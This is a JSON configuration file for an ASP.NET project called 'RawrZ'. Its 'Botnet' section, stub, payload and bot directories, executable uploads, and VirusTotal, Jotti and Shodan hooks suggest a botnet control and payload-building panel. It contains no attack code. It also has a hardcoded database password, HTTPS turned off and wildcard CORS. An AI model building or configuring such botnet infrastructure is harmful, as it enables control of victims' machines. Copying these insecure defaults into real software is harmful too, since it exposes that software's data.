{
  "Logging": {
    "LogLevel": {
      "Default": "Information",
      "Microsoft.AspNetCore": "Warning",
      "RawrZ": "Debug"
    }
  },
  "AllowedHosts": "*",
  "ConnectionStrings": {
    "DefaultConnection": "Host=localhost;Database=rawrz_security;Username=rawrz_user;Password=rawrz_secure_password_2024",
    "Redis": "localhost:6379"
  },
  "Security": {
    "EncryptionKey": "your-256-bit-encryption-key-change-in-production",
    "JwtSecret": "your-super-secret-jwt-key-change-in-production",
    "AuthToken": "your-auth-token-for-api-access",
    "RequireHttps": false,
    "SessionTimeout": 3600
  },
  "Botnet": {
    "MaxBots": 1000,
    "HeartbeatInterval": 30,
    "CommandTimeout": 30000,
    "AutoCleanup": true,
    "CleanupInterval": 300
  },
  "FileManagement": {
    "MaxFileSize": "100MB",
    "AllowedExtensions": [".exe", ".dll", ".bin", ".dat", ".txt", ".json", ".xml"],
    "UploadDir": "./uploads",
    "DownloadDir": "./downloads",
    "TempDir": "./temp",
    "LogsDir": "./logs",
    "DataDir": "./data",
    "KeysDir": "./keys",
    "StubsDir": "./stubs",
    "PayloadsDir": "./payloads",
    "BotsDir": "./bots",
    "CveDir": "./cve",
    "EnginesDir": "./engines",
    "BackupsDir": "./backups"
  },
  "API": {
    "RateLimit": 100,
    "Timeout": 30,
    "CorsOrigins": ["*"],
    "EnableSwagger": true,
    "EnableMetrics": true
  },
  "Monitoring": {
    "Prometheus": {
      "Enabled": true,
      "Port": 9090,
      "Path": "/metrics"
    },
    "Grafana": {
      "Enabled": true,
      "Port": 3001
    },
    "Loki": {
      "Enabled": true,
      "Port": 3100
    }
  },
  "ExternalServices": {
    "Telegram": {
      "BotToken": "",
      "ChatId": "",
      "Enabled": false
    },
    "Email": {
      "SmtpHost": "",
      "SmtpPort": 587,
      "SmtpUser": "",
      "SmtpPassword": "",
      "FromEmail": "",
      "Enabled": false
    },
    "VirusTotal": {
      "ApiKey": "",
      "Enabled": false
    },
    "Jotti": {
      "ApiKey": "",
      "Enabled": false
    },
    "Shodan": {
      "ApiKey": "",
      "Enabled": false
    }
  },
  "Encryption": {
    "DefaultAlgorithm": "aes-256-gcm",
    "KeyDerivation": "pbkdf2",
    "Iterations": 100000,
    "SaltLength": 32,
    "IvLength": 16
  },
  "Database": {
    "Provider": "PostgreSQL",
    "Host": "localhost",
    "Port": 5432,
    "Database": "rawrz_security",
    "Username": "rawrz_user",
    "Password": "rawrz_secure_password_2024",
    "SslMode": "Prefer",
    "PoolSize": 20,
    "CommandTimeout": 30
  }
}
